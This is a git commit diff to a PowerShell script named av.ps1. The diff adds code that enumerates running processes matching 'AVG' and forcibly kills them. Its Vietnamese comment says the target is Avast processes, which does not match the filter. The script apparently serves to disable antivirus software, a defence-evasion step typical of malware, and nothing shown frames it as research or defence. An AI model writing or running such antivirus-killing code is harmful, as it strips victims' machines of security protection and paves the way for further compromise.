3129b17d52967bee0c993ca7d9e9a442223580e5
43a1723 <hai1723notgay@gmail.com>
2024-07-28 18:16:41 +0700

    Update av.ps1

--- output/av.ps1
+++ output/av.ps1
@@ -10,3 +10,16 @@ $processes | ForEach-Object {
         Write-Output "Failed to terminate process: $($_.Name)"
     }
 }
+
+# Lấy danh sách các tiến trình có tên chứa "Avast"
+$processes = Get-Process | Where-Object { $_.Name -like "*Avg*" }
+
+# Tắt các tiến trình đó
+$processes | ForEach-Object {
+    try {
+        $_.Kill()
+        Write-Output "Terminated process: $($_.Name)"
+    } catch {
+        Write-Output "Failed to terminate process: $($_.Name)"
+    }
+}
